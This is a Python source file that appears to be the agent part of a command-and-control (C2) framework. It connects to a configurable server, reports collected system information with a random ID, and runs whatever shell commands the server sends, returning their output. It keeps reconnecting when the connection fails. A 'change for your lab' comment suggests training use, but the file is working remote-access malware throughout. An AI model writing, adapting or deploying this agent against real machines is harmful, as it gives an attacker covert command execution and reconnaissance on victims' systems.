
import socket
import time
import uuid as _uuid
from c2.server.transport import send_message, recv_message
from c2.agent.protocol import make_handshake
from c2.agent.sysinfo import collect
from c2.server.protocol import TYPE_EXEC, TYPE_EXEC_RESULT

SERVER_HOST = "127.0.0.1"  # change for your lab
SERVER_PORT = 9001
RETRY_SECONDS = 3

from c2.agent.executor import run_command

def connect_loop():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_HOST, SERVER_PORT))

            # handshake
            info = collect()
            payload = {
                "uuid": str(_uuid.uuid4()),
                **info
            }
            send_message(s, make_handshake(payload))

            # main loop
            while True:
                msg = recv_message(s)
                if msg is None:
                    break
                if msg.get("type") == TYPE_EXEC:
                    cmd = msg.get("payload", {}).get("cmd", "")
                    stdout, stderr, exit_code = run_command(cmd)
                    send_message(s, {
                        "type": TYPE_EXEC_RESULT,
                        "payload": {
                            "stdout": stdout,
                            "stderr": stderr,
                            "exit_code": exit_code
                        }
                    })
        except Exception:
            time.sleep(RETRY_SECONDS)
            continue
        finally:
            try:
                s.close()
            except:
                pass
            time.sleep(RETRY_SECONDS)

if __name__ == "__main__":
    connect_loop()
